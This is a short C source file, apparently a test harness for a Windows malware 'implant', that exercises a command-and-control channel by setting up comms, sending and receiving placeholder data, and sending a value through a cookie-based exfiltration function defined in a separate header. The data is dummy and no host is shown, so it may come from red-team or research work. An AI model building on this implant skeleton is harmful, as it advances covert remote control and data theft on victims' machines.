#include <windows.h>
#include <stdlib.h>
#include <malloc.h>
#include <string.h>
#include <shlwapi.h>
#include <processthreadsapi.h>

#include "c2_comms.h"

#pragma comment(lib, "Shlwapi.lib")
#pragma comment(lib, "Advapi32.lib")
#pragma comment(lib, "Pathcch.lib")

// Global heap handle
HANDLE heap;

// Present working directory, globally accessible
char pwd[MAX_PATH + 1] = {0};
 



// cl implant.c  /Fe:implant.exe /DDEBUG
// cl implant.c /Fe:implant.exe
int main() {
    int status = 0;
    unsigned int len = 0;
    char buffer[1024] = {0};


    // Basic setup
    status = SetupComms();
    if (status < 0) {
        c2_log("[!] ERROR in comms setup\n");
        return -1;
    }
    c2_log("[+] Comms setup sucessfully\n");
    heap = GetProcessHeap();


    // Test send data
    len = c2_send("AAAA", 4);
    if (len == 0) {
        c2_log("[!] data send failed\n");
        return -1;
    }
    c2_log("[+] data send succeeded\n");

    // Test recieve data
    len = c2_recv(buffer, 1024);
    if (len == 0) {
        c2_log("[!] data recv failed\n");
    }
    c2_log("[+] data recv success: %s\n", buffer);

    // Test send data 2
    len = c2_send("BBBB", 4);
    if (len == 0) {
        printf("here\n");
        return -1;
    }


    // Test send cookie data
    len = c2_send_cookie(L"ahhh_coookie", 12);
    if (len == 0) {
        c2_log("[!] cookie send failed\n");
        return -1;
    }
    c2_log("[+] cookie send succeeded\n");





    TearDownComms();
    return 0;
}
